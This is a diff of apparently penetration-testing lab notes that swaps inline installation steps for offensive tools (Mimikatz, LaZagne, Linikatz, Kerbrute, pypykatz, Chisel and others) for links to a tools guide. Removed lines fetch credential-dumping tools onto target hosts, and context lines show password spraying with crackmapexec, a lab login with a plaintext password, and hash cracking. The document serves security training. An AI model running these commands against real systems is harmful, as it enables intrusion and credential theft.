@@ -2223,27 +2223,7 @@ The easiest method for mounting a BitLocker-encrypted virtual drive on Windows i
 
 To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker).
 
-1. **Install** the tool
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo apt-get install dislocker
-```
-
-</td>
-</tr>
-</table>
+📦 **Installation:** See [Dislocker](../TOOLS.md#dislocker) in the Tools Guide.
 
 2. **Create** two folders for mounting
 
@@ -2593,29 +2573,9 @@ crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST> -q
 
 **Evil-WinRM**
 
-1. **Install** Evil-WinRM
+📦 **Installation:** See [Evil-WinRM](../TOOLS.md#evil-winrm) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo gem install evil-winrm
-```
-
-</td>
-</tr>
-</table>
-
-2. **Connect** to WinRM service
+**Connect** to WinRM service
 
 <table width="100%">
 <tr>
@@ -3069,29 +3029,9 @@ Network infrastructure devices and enterprise software frequently ship with fact
 
 While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).
 
-1. **Install** the tool
+📦 **Installation:** See [DefaultCreds-Cheat-Sheet](../TOOLS.md#defaultcreds) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-pip3 install defaultcreds-cheat-sheet
-```
-
-</td>
-</tr>
-</table>
-
-2. **Search** for default credentials
+**Search** for default credentials
 
 Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.
 
@@ -3684,35 +3624,13 @@ If we manage to run this command and generate the lsass.dmp file, we can proceed
 
 Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.
 
-1. **Install** pypykatz
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-git clone https://github.com/skelsec/pypykatz.git
-cd pypykatz
-sudo python3 setup.py install
-```
-
-</td>
-</tr>
-</table>
+📦 **Installation:** See [Pypykatz](../TOOLS.md#pypykatz) in the Tools Guide.
 
 At the time of writing, Mimikatz only runs on Windows systems. This means we'd either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.
 
 When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.
 
-2. **Run** pypykatz
+**Run** pypykatz
 
 <table width="100%">
 <tr>
@@ -4285,31 +4203,9 @@ nano ~/names.txt
 
 We can create a custom list using an automated list generator such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
 
-1. **Install** Username Anarchy
+📦 **Installation:** See [Username-Anarchy](../TOOLS.md#username-anarchy) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-git clone https://github.com/urbanadventurer/username-anarchy.git
-cd username-anarchy
-chmod +x username-anarchy
-```
-
-</td>
-</tr>
-</table>
-
-2. **Generate** usernames
+**Generate** usernames
 
 <table width="100%">
 <tr>
@@ -4340,31 +4236,9 @@ chmod +x username-anarchy
 
 Before initiating password-based attacks, verifying username validity prevents wasted effort on non-existent accounts. Kerbrute streamlines this process.
 
-1. **Install** Kerbrute
+📦 **Installation:** See [Kerbrute](../TOOLS.md#kerbrute) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
-chmod +x kerbrute
-sudo mv kerbrute /usr/local/bin/
-```
-
-</td>
-</tr>
-</table>
-
-2. **Enumerate** valid usernames
+**Enumerate** valid usernames
 
 <table width="100%">
 <tr>
@@ -5680,30 +5554,9 @@ Many different logs exist on the system:
 - **Web browsers** (Chrome, Firefox stored passwords)
 - **System services** (SSH keys, sudo tokens)
 
-1. **Install** Mimipenguin
+📦 **Installation:** See [Mimipenguin](../TOOLS.md#mimipenguin) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`target@victim:~$`**
-
-</td>
-<td>
-
-```bash
-git clone https://github.com/huntergregal/mimipenguin
-cd mimipenguin/
-```
-
-</td>
-</tr>
-</table>
-
-2. **Run** Mimipenguin (Python)
+**Run** Mimipenguin (Python)
 
 <table width="100%">
 <tr>
@@ -5754,33 +5607,9 @@ sudo ./mimipenguin.sh
 
 An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials.
 
-1. **Install** LaZagne
+📦 **Installation:** See [LaZagne](../TOOLS.md#lazagne) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`target@victim:~$`**
-
-</td>
-<td>
-
-```bash
-git clone https://github.com/AlessandroZ/LaZagne
-cd LaZagne/
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-cd Linux/
-```
-
-</td>
-</tr>
-</table>
-
-2. **Run** LaZagne
+**Run** LaZagne
 
 <table width="100%">
 <tr>
@@ -5894,60 +5723,9 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. The script is [`here`](../scripts/passwords/firefox_decrypt.py).
 
-1. **Download** the tool
+📦 **Installation:** See [Firefox_Decrypt](../TOOLS.md#firefox-decrypt) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-git clone https://github.com/unode/firefox_decrypt
-cd firefox_decrypt/
-```
-
-</td>
-</tr>
-</table>
-
-2. **Install** Python 3.9+ (if needed)
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-wget https://www.python.org/ftp/python/3.9.18/Python-3.9.18.tar.xz
-tar -xf Python-3.9.18.tar.xz
-cd Python-3.9.18
-./configure --enable-optimizations
-make -j$(nproc)
-sudo make altinstall
-cd ..
-rm -rf Python-3.9.18
-rm Python-3.9.18.tar.xz
-```
-
-</td>
-</tr>
-</table>
-
-3. **Run** firefox_decrypt
+**Run** firefox_decrypt
 
 <table width="100%">
 <tr>
@@ -6010,32 +5788,9 @@ This code has only been tested on windows, so it may not work on other OS.
 
 2. Install [Python](https://www.python.org/downloads/) for Windows
 
-3. **Install** the tool
+📦 **Installation:** See [Decrypt-Chrome-Passwords](../TOOLS.md#decrypt-chrome-passwords) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> 📟 <b>CMD — Windows - Target</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`C:\>`**
-
-</td>
-<td>
-
-```cmd
-git clone https://github.com/ohyicong/decrypt-chrome-passwords.git
-cd decrypt-chrome-passwords
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-```
-
-</td>
-</tr>
-</table>
-
-4. **Run** the tool
+**Run** the tool
 
 <table width="100%">
 <tr>
@@ -6092,29 +5847,7 @@ Despite widespread TLS adoption, legacy systems and misconfigurations often expo
 
 Wireshark is a well-known packet analyzer that comes pre-installed on nearly all penetration testing Linux distributions. It features a powerful filtering engine, allowing efficient analysis of both live and captured network traffic.
 
-**Install**
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo apt update
-sudo apt install wireshark -y
-wireshark --version
-```
-
-</td>
-</tr>
-</table>
+📦 **Installation:** See [Wireshark](../TOOLS.md#wireshark) in the Tools Guide.
 
 **Usage**
 
@@ -6252,31 +5985,9 @@ Pcredz is a tool that can be used to extract credentials from live traffic or ne
 - NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
 - Kerberos (AS-REQ Pre-Auth etype 23) hashes
 
-1. **Install** Pcredz
+📦 **Installation:** See [PCredz](../TOOLS.md#pcredz) in the Tools Guide.
 
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo apt install -y python3-pip libpcap-dev file && sudo pip3 install Cython python-libpcap
-git clone https://github.com/lgandx/PCredz.git
-cd PCredz
-```
-
-</td>
-</tr>
-</table>
-
-2. **Extract** credentials from a pcap file
+**Extract** credentials from a pcap file
 
 <table width="100%">
 <tr>
@@ -6717,50 +6428,7 @@ Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\
 
 If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run MANSPIDER using the official Docker container to avoid dependency issues.
 
-1. **Install** prerequisites
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo apt install tesseract-ocr && sudo apt install antiword
-```
-
-</td>
-</tr>
-</table>
-
-2. **Install** MANSPIDER
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-pip install pipx
-pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
-```
-
-</td>
-</tr>
-</table>
+📦 **Installation:** See [Tesseract-OCR](../TOOLS.md#tesseract-ocr) and [MANSPIDER](../TOOLS.md#manspider) in the Tools Guide.
 
 **Alternative: Install using Docker**
 
@@ -9476,7 +9144,9 @@ socks5 127.0.0.1 1080
 </tr>
 </table>
 
-**Download** Chisel to our attack host and start the server.
+📦 **Installation:** See [Chisel](../TOOLS.md#chisel) in the Tools Guide.
+
+**Start** the Chisel server on our attack host.
 
 <table width="100%">
 <tr>
@@ -9491,9 +9161,6 @@ socks5 127.0.0.1 1080
 <td>
 
 ```bash
-wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
-gzip -d chisel_1.7.7_linux_amd64.gz
-mv chisel_* chisel && chmod +x ./chisel
 sudo ./chisel server --reverse
 ```
 
@@ -9687,27 +9354,7 @@ whoami
 
 To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name, and the KDC is the DC01.
 
-1. **Install** Kerberos authentication package.
-
-<table width="100%">
-<tr>
-<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
-</tr>
-<tr>
-<td width="20%">
-
-**`kali@kali:~$`**
-
-</td>
-<td>
-
-```bash
-sudo apt-get install krb5-user -y
-```
-
-</td>
-</tr>
-</table>
+📦 **Installation:** See [Kerberos 5 (krb5-user)](../TOOLS.md#krb5-user) in the Tools Guide.
 
 In case the package krb5-user is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
 
@@ -10001,19 +9648,7 @@ dir \\dc01\julio
 
 Like Mimikatz, Linikatz requires root privileges to operate. Once executed, it extracts credentials—including Kerberos tickets—from various implementations such as FreeIPA, SSSD, Samba, and Vintella. The dumped credentials are stored in a folder prefixed with linikatz. and are available in multiple formats, including ccache and keytab.
 
-**Download Linikatz**
-
-<table width="100%">
-<tr><td colspan="2"> 🎯 <b>bash — Linux - Target (root)</b> </td></tr>
-<tr><td width="20%">**`root@linux:~#`**</td><td>
-
-```bash
-wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
-chmod +x linikatz.sh
-```
-
-</td></tr>
-</table>
+📦 **Installation:** See [Linikatz](../TOOLS.md#linikatz) in the Tools Guide.
 
 **Run Linikatz**
 
@@ -10229,26 +9864,9 @@ Referring back to `ntlmrelayx`, we can see from the output that the authenticati
 
 We can now perform a Pass-the-Certificate attack to obtain a TGT as DC01$. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py).
 
-**Step 4: Clone the PKINITtools repository and install the dependencies**
+📦 **Installation:** See [PKINITtools](../TOOLS.md#pkinittools) in the Tools Guide.
 
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r requirements.txt
-pip3 install -I git+https://github.com/wbond/oscrypto.git
-```
-
-</td></tr>
-</table>
-
-> Note: If you encounter error stating "Error detecting the version of libcrypto", it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.
-
-**Step 5: Request TGT with Pass-the-Certificate (inside the .venv)**
+**Step 4: Request TGT with Pass-the-Certificate (inside the .venv)**
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
@@ -10364,37 +9982,9 @@ echo "<DC01_IP> DC01.<CORP>.LOCAL" | sudo tee -a /etc/hosts
 </td></tr>
 </table>
 
-**Step 2: Install `pywhisker`**
+📦 **Installation:** See [Pywhisker](../TOOLS.md#pywhisker) and [PKINITtools](../TOOLS.md#pkinittools) in the Tools Guide.
 
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-pip3 install pywhisker
-```
-
-</td></tr>
-</table>
-
-**Step 3: Clone and Set Up `PKINITtools`**
-
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r requirements.txt
-pip3 install -I git+https://github.com/wbond/oscrypto.git
-```
-
-</td></tr>
-</table>
-
-**Step 4: Configure Kerberos (`/etc/krb5.conf`)**
+**Step 2: Configure Kerberos (`/etc/krb5.conf`)**
 
 Edit your Kerberos config file:
 
@@ -10436,18 +10026,7 @@ Replace its content with the following (adjust placeholders):
 
 This config is required for Kerberos tools to find the realm and KDC manually.
 
-**Step 5: Install Kerberos User Tools**
-
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-sudo apt install krb5-user -y
-```
-
-</td></tr>
-</table>
+📦 **Installation:** See [Kerberos 5 (krb5-user)](../TOOLS.md#krb5-user) in the Tools Guide.
 
 During installation, enter the following when prompted:
 
@@ -10910,20 +10489,7 @@ cat ~/name.txt
 </td></tr>
 </table>
 
-**(ATTACK HOST) Install [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)**
-
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-git clone https://github.com/urbanadventurer/username-anarchy.git
-cd username-anarchy
-chmod +x username-anarchy
-```
-
-</td></tr>
-</table>
+📦 **Installation:** See [Username-Anarchy](../TOOLS.md#username-anarchy) in the Tools Guide.
 
 **(ATTACK HOST) Generate usernames**
 
@@ -11258,18 +10824,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
 
 Now, we can open the file using the master password:
 
-**Install pwsafe**
-
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-sudo apt install pwsafe
-```
-
-</td></tr>
-</table>
+📦 **Installation:** See [PWsafe](../TOOLS.md#pwsafe) in the Tools Guide.
 
 **Open the file**
 
@@ -11805,20 +11360,7 @@ crackmapexec smb 172.16.119.11 -u 'bdavid' -p 'caramel-cigars-reply1' --groups '
 <details>
 <summary><h5>Step 5.3. EvilWinRm and Mimikatz</h5></summary>
 
-**(ATTACK HOST) Download the latest Mimikatz release (ZIP format) from the official repository:**
-
-<table width="100%">
-<tr><td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
-
-```bash
-wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
-unzip mimikatz_trunk.zip
-cd x64
-```
-
-</td></tr>
-</table>
+📦 **Installation:** See [Mimikatz](../TOOLS.md#mimikatz) in the Tools Guide.
 
 **(ATTACK HOST) Start Evil-WinRM via proxychains:**
 
